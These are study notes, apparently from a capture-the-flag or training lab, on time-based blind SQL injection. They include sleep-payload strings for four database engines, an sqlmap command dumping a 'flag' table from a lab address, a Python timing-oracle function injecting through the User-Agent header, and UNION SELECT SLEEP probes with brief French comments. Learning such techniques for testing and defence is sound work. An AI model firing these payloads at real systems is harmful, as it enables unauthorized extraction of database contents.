\section{Time based Injection}
\subsection{Introduction}
A  time-based blind SQL Injection is very similar to the above Boolean  based, in that the same requests are sent, but there is no visual  indicator of your queries being wrong or right this time. Instead, your  indicator of a correct query is based on the time the query takes to  complete. This time delay is introduced by using built-in methods such  as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 

\begin{verbatim}
Database 	        Payload
MSSQL 	            WAITFOR DELAY '0:0:10'
MySQL/MariaDB 	    AND (SELECT SLEEP(10) FROM dual WHERE database() LIKE '%')
PostgreSQL 	        || (SELECT 1 FROM PG_SLEEP(10))
Oracle 	            AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('RaNdStR',10)
\end{verbatim}

\subsection{SQLMap}
\begin{verbatim}
$ sqlmap -u http://10.129.204.197:8080/ \
    --technique=T \
    -p User-Agent --level=5 --risk=3 \
    --dbms='Microsoft SQL Server' \
    -D digcraft -T flag --dump
 
\end{verbatim}


\subsection{Oracle}

\begin{verbatim}
import requests
import time
DELAY = 1

def oracle(q):
    start = time.time()
    r = requests.get(
        "http://SERVER_IP:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"}
    )
    return time.time() - start > DELAY
\end{verbatim}

field enumération

\begin{verbatim}
admin123' UNION SELECT SLEEP(5);--
\end{verbatim}
si prend 5 sec c'est que c'est bon

\begin{verbatim}
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
\end{verbatim}


